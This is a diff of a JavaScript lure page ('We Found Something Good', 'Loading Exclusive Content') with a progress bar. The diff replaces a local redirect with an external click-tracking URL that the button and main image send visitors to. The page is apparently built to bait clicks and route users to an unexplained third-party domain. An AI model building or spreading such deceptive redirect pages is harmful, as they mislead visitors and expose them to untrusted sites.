@@ -5,7 +5,7 @@ let progress = 0;
 document.title = "We Found Something Good";
 
 // Secure redirect path using obscured filename and key
-const redirectPath = 'x_track12.html?k=d91xq2m7r8';
+const redirectPath = 'https://distroutshantimal.com/click';
 
 function getColor(progress) {
   if (progress < 50) {
@@ -40,17 +40,27 @@ const interval = setInterval(() => {
 
 button.addEventListener('click', () => {
   document.title = "Loading Exclusive Content";
-  window.location.href = redirectPath;
 });
 
 setTimeout(() => {
   if (progress === 0) {
     document.title = "Loading Exclusive Content";
-    window.location.href = redirectPath;
   }
 }, 6000);
 
 setTimeout(() => {
   document.title = "Loading Exclusive Content";
-  window.location.href = redirectPath;
-}, 30000);
+}, 40000);
+
+
+// Redirect on image click
+const image = document.querySelector('.main-image-shimmer');
+image.addEventListener('click', () => {
+});
+document.getElementById("continueButton").addEventListener("click", function () {
+  window.location.href = "https://distroutshantimal.com/click";
+});
+
+document.querySelector(".main-image").addEventListener("click", function () {
+  window.location.href = "https://distroutshantimal.com/click";
+});
